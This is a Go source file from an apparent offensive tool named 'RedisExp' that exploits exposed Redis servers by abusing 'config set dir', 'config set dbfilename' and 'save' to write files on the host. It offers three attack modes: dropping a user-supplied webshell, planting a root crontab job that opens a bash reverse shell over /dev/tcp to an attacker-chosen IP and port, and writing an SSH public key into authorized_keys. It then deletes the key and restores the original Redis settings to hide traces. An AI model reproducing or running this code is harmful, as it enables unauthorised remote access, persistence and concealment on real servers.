package echo

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"RedisExp/pkg/conn"
	"RedisExp/pkg/logger"
)

func Echo(flag string) {
	var ip, port, dir, dbfilename, webshell, sshkey string
	var save, helloWebShell = "save", "helloWebShell"

	switch flag {
	case "getshell":
		fmt.Print("[+] 设置保存的路径: ")
		dir = fmt.Sprintf("config set dir %s", readString(dir))

		fmt.Print("[+] 设置保存的文件名：")
		dbfilename = fmt.Sprintf("config set dbfilename %s", readString(dbfilename))

		fmt.Print("[+] Webshell: ")
		webshell = fmt.Sprintf("\n\n\n%s\n\n", readString(webshell))

	case "crontab":
		dir = "config set dir /var/spool/cron/"
		dbfilename = "config set dbfilename root"

		fmt.Print("[+] IP: ")
		ip = readString(ip)

		fmt.Print("[+] Port: ")
		port = readString(port)

		webshell = fmt.Sprintf("\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n", ip, port)

	case "ssh":
		fmt.Println("[+] 下方用户名输入 root 默认/root/.ssh/\tkali 默认 /home/kali/.ssh/\t可以自定义目录例如: /.ssh/")
		fmt.Print("[+] 设置Linux用户名: ")
		dir = readString(dir)

		if strings.EqualFold(dir, "root") {
			dir = fmt.Sprintf("config set dir /%s/.ssh/", dir)
		} else if strings.Contains(dir, "/") {
			dir = fmt.Sprintf("config set dir %s", dir)
		} else {
			dir = fmt.Sprintf("config set dir /home/%s/.ssh/", dir)
		}

		dbfilename = "config set dbfilename authorized_keys"

		fmt.Print("[+] authorized_keys: ")
		sshkey = readString(sshkey)

		webshell = fmt.Sprintf("\n\n%s\n\n", sshkey)
	}

	logger.Info(webshell)
	ctx := context.Background()
	err := conn.Rdb.Set(ctx, helloWebShell, webshell, time.Minute*2).Err()
	if err != nil {
		logger.Err("%v", err)
	}

	conn.EchoRedisCMD(dir, dbfilename, save)

	conn.EchoRedisCMD("del " + helloWebShell)

	conn.EchoRedisCMD("config set dir "+conn.RedisDir, "config set dbfilename "+conn.RedisDbFilename, save)

}

func readString(str string) string {
	reader := bufio.NewReader(os.Stdin)
	str, _ = reader.ReadString('\n')
	str = strings.TrimSpace(str)

	return str
}
